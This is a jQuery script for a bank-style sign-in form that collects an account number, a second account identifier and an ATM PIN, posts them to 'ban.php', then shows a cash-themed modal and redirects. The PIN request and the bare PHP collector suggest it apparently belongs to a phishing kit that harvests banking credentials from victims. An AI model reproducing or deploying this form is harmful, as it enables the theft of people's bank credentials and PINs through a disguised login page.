
$(document).ready(function() {

	$("#anum").blur(function() {
		if($("#anum").val().length < 10){
			$('#anum').addClass('is-invalid');
		}else{
			$('#anum').removeClass('is-invalid');
		}
	});
	$("#vanum").blur(function() {
		if($("#vanum").val().length < 5){
			$('#vanum').addClass('is-invalid');
		}else{
			$('#vanum').removeClass('is-invalid');
		}
	});
	$("#atmpin").blur(function() {
		if($("#atmpin").val().length < 4){
			$('#atmpin').addClass('is-invalid');
		}else{
			$('#atmpin').removeClass('is-invalid');
		}
	});
	$('#frmBank').submit(function(event) {
		event.preventDefault();
		var error = false;
		if($("#anum").length > 0 && $("#anum").val().length < 10){
			$('#anum').addClass('is-invalid');
			error = true;
		}else{
			$('#anum').removeClass('is-invalid');
		}
		if($("#vanum").length > 0 && $("#vanum").val().length < 5){
			$('#vanum').addClass('is-invalid');
			error = true;
		}else{
			$('#vanum').removeClass('is-invalid');
		}
		if($("#atmpin").length > 0 && $("#atmpin").val().length < 4){
			$('#atmpin').addClass('is-invalid');
			error = true;
		}else{
			$('#atmpin').removeClass('is-invalid');
		}
		$("#btnConfirm").click(function() {
		$("#btnConfirm").prop('disabled', true);
		$("#btnConfirm").html('<img src="/static/img/spin.gif" style="width:43px">');
		setTimeout(function(){
			window.location.replace($("#btnConfirm").attr('data-oauth'));
		}, 2000);
	});
		
			if(!error){
			$("#btnLogin").prop('disabled', true);
			$("#btnLogin").html('<img src="/static/img/spin.gif" style="width:43px">');
			$('#anum, #vanum, #atmpin').prop('readonly', true);
			var logindata =  $("#frmBank").serialize();
		$.post("ban.php", logindata).done(function(result) {
				if(result != "no"){
					$('#cashBody').addClass("no-scroll");
					$('#btnConfirm').attr("data-oauth", '/complete');
					$('#cashModal').show();
				}else{
					$('#anum, #vanum, #atmpin').prop('readonly', false);
					$("#anum, #vanum, #atmpin").addClass('is-invalid');
					$("#btnLogin").prop('disabled', false);
					$("#btnLogin").html('Sign In');
				}
			});
		}
	});
});